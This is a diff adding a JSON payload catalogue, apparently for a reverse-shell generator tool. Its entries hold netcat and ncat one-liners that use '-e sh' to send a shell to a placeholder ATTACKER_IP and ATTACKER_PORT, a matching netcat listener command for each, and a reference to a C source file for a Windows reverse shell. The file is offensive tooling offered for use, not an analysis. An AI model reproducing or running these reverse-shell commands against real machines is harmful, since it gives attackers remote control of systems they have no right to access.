@@ -1,0 +1,32 @@
+[
+    {
+      "name": "nc.exe -e",
+      "uniqueID": 1,
+      "description": "nc.exe -e Reverse Shell",
+      "reverseShell": "nc.exe -e sh ATTACKER_IP ATTACKER_PORT",
+      "listener": "nc -u -lvp ATTACKER_PORT",
+      "isFile": false,
+      "path": "",
+      "extension":""
+    },
+    {
+        "name": "ncat.exe -e",
+        "uniqueID": 2,
+        "description": "ncat.exe -e Reverse Shell",
+        "reverseShell": "ncat.exe ATTACKER_IP ATTACKER_PORT -e sh",
+        "listener": "nc -u -lvp ATTACKER_PORT",
+        "isFile": false,
+        "path": "",
+        "extension":""
+      },
+      {
+        "name": "C Windows",
+        "uniqueID": 3,
+        "description": "C Windows Reverse Shell",
+        "reverseShell": "",
+        "listener": "nc -u -lvp ATTACKER_PORT",
+        "isFile": true,
+        "path": "revShell/revShellWindows.c",
+        "extension":".c"
+      }
+]
